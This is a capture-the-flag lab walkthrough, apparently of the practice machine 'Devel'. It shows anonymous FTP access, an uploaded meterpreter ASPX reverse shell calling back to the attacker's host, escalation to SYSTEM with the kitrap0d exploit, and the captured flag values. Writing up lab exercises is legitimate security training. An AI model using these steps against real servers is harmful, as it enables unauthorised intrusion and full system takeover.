# Devel

## SYN Scan
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
```

## Anonymous FTP
```
$ ftp 10.10.10.5 
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:cpt): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-25-21  03:09PM                 4529 shell.ps1
03-17-17  04:37PM               184946 welcome.png
```

## RCE via File Upload
Uploaded a meterpreter ASPX reverse shell.

```
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-25-21  05:09PM                 2895 shell.aspx
03-17-17  04:37PM               184946 welcome.png
```

```
[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.5:49157) at 2021-03-25 18:09:43 +0300

meterpreter > getuid
Server username: IIS APPPOOL\Web
```

## Privilege Escalation
`ms10_015_kitrap0d`

```
msf6 exploit(windows/local/ms10_015_kitrap0d) > check
[*] The service is running, but could not be validated.
msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Launching notepad to host the exploit...
[+] Process 1476 launched.
[*] Reflectively injecting the exploit DLL into 1476...
[*] Injecting exploit into 1476 ...
[*] Exploit injected. Injecting payload into 1476...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.11:4444 -> 10.10.10.5:49162) at 2021-03-26 14:16:35 +0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## The User Flag
```
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\users\babis\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-17 17:17:51 +0300  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 02:14:21 +0300  user.txt.txt

meterpreter > cat user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
```

## The Root Flag
```
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 02:16:53 +0300  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 02:17:20 +0300  root.txt

meterpreter > cat root.txt
e621a0b5041708797c4fc4728bc72b4b
```
